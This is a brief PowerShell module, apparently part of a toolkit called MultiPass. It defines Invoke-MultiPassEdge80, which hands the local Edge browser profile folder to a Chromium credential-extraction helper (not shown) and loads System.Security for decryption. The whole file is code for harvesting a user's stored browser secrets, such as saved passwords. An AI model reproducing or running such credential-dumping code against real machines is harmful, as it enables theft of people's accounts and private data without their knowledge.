# Add utils dependencies
# <% utils.add("MultiPassChromium.ps1") %>

# Add assembly dependencies
# <% assembly.add("System.Security") %>
function Invoke-MultiPassEdge80 {
    $export = MultiPassChromium("$($env:LOCALAPPDATA)\Microsoft\Edge\User Data")
    $export.category = "Browser"
    $export.software = "Edge80"
    return $export
}